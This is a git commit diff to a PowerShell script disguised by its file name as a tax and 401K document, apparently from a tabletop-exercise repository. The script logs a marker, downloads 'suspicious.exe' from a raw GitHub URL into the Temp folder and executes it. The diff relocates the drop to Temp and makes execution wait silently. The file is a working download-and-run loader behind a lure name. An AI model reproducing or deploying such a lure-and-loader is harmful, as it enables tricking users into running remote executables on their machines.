6f45a5de12589aec454904cec66e1769cc492128
ttx-playground <sameer_goyal91@yahoo.com>
2025-06-16 14:47:22 -0500

    Update My-Tax-Documents-401K-info.ps1

--- My-Tax-Documents-401K-info.ps1
+++ My-Tax-Documents-401K-info.ps1
@@ -1,15 +1,21 @@
 <#
 .SYNOPSIS
     My-Tax-Documents-401K-info.ps1
+.DESCRIPTION
+    1) Logs execution to marker.txt in Temp  
+    2) Downloads the real loader EXE into Temp  
+    3) Executes the downloaded loader  
+#>
 
 # 1) Write a marker so investigators see the script ran
-$marker = Join-Path $env:USERPROFILE "Downloads\marker.txt"
-"[+] My-Tax-Documents-401K-info.ps1 executed at $(Get-Date -Format o)" | Out-File -FilePath $marker -Append
+$marker = Join-Path $env:TEMP 'marker.txt'
+"[+] My-Tax-Documents-401K-info.ps1 executed at $(Get-Date -Format o)" |
+    Out-File -FilePath $marker -Append
 
-# 2) Download the real loader EXE into Downloads
-$loaderUrl  = "https://github.com/ttx-playground/TTX/blob/main/suspicious.exe"
-$loaderPath = Join-Path $env:USERPROFILE "Downloads\suspicious.exe"
+# 2) Download the real loader EXE into Temp (raw URL)
+$loaderUrl  = 'https://raw.githubusercontent.com/ttx-playground/TTX/main/suspicious.exe'
+$loaderPath = Join-Path $env:TEMP 'suspicious.exe'
 Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath -UseBasicParsing
 
 # 3) Execute the downloaded loader under the user context
-Start-Process -FilePath $loaderPath
+Start-Process -FilePath $loaderPath -NoNewWindow -Wait
